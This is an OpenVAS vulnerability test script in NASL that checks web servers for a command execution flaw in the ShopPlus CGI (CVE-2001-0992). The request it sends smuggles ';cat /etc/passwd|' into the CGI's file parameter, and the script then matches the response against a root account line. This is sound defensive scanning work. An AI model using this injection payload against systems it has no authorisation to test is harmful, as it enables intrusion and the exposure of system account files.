# OpenVAS Vulnerability Test
# $Id: shopplus_information_disclosure.nasl 17 2013-10-27 14:01:43Z jan $
# Description: ShopPlus Arbitrary Command Execution
#
# Authors:
# Noam Rathaus <noamr@securiteam.com>
#
# Copyright:
# Copyright (C) 2001 Noam Rathaus <noamr@securiteam.com>
# Copyright (C) 2001 SecuriTeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_solution = "Upgrade to the latest version available by contacting the author of the program.

Additional information:
http://www.securiteam.com/unixfocus/5PP021P5FK.html";

tag_summary = "The ShopPlus CGI is installed. Some versions of this CGI suffer from a 
vulnerability that allows execution of arbitrary commands with the security 
privileges of the web server.";


if(description)
{
 script_id(10774); 
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
script_cve_id("CVE-2001-0992");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");

 name = "ShopPlus Arbitrary Command Execution";
 script_name(name);

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);

 summary = "ShopPlus Arbitrary Command Execution";
 script_summary(summary);

 script_category(ACT_GATHER_INFO);

 script_copyright("This script is Copyright (C) 2001 SecuriTeam");
 family = "Web application abuses";
 script_family(family);

 script_dependencies("find_service.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
   script_tag(name : "solution" , value : tag_solution);
 }
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

# Converts www.honlolo.hostname.com to hostname.com
function reverse_remove(in_string)
{
 finished = 1;
 first = 1;

 #display("in_string: ", in_string, "\n");
 _ret = "";
 for (count = strlen(in_string)-1; finished;)
 {
  #display("count: ", count, "\n");
  #display("in_string[count]: ", in_string[count], "\n");
  if (in_string[count] == string("."))
  {
   if (first)
   {
    first = 0;
#    display("First\n");
   }
   else
   {
    finished = 0;
   }
  }

  if (finished) _ret = string(in_string[count], _ret);

  if (count > 0)
  {
   count = count - 1;
  }
  else
  {
   finished = 0;
  }

 }

 return (_ret);
}


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
url = string(dir, "/shopplus.cgi");
if (is_cgi_installed_ka(item:url, port:port))
  {
   hostname = get_host_name();
   fixed_hostname = reverse_remove(in_string:hostname);
   url = string(dir, "/shopplus.cgi?dn=", fixed_hostname, "&cartid=%CARTID%&file=;cat%20/etc/passwd|");
   req = http_get(item:url, port:port);
   buf = http_keepalive_send_recv(port:port, data:req);
   if( buf == NULL ) exit(0);
   if (egrep(pattern:"root:.*:0:.*", string:buf))
    {
     security_hole(port:port);
     exit(0);
    }
  }
}
